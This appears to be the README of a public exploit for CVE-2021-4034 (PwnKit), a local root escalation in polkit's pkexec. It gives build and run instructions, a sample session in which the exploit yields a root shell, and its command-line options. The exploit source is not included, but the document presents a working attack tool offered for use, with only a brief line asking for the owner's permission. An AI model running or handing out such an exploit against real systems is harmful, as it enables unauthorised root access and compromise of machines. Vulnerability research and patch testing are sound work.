# CVE-2021-4034 Exploit

Root exploit for the PWNKit vulnerability. Check out the original report
[here](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt).

*Use this exploit with an express permission of the target system owners.*

I'm currently working on my own writeup, including an interesting detail, which
makes exploiting much older version different/easier.

## Building

No dependencies needed besides libc. Just run `make`.

## Running

Running without options will execute the exploit:

```
[linux@linux ~]$ ./exploit
-----------------------------------------------------------------------------
 __\ / __   __  _ __           _ __        |    \ / _ ___
/   V |_ --- _)/ \ _)/| ---|_|/ \__)|_|    |     V |_) _/|_|
\__   |__   /__\_//__ |      |\_/__)  |    |       | \/__| |
-----------------------------------------------------------------------------
sh-5.1# whoami
root
sh-5.1#
```

You can customize the path to `pkexec` as well as the "from" charset:
```
[linux@linux ~]$ ./exploit -h
...
./exploit [-c] [-h] [-f from_charset] [-p /path/to/pkexec]
-----------------------------------------------------------------------------
    -c                  Just teardown - don't exploit
    -p <path>           Path to pkexec (default: "/usr/bin/pkexec")
    -f <from_charset>   Custom "from" charset (default: "UTF-8")
    -h                  Display this message
```
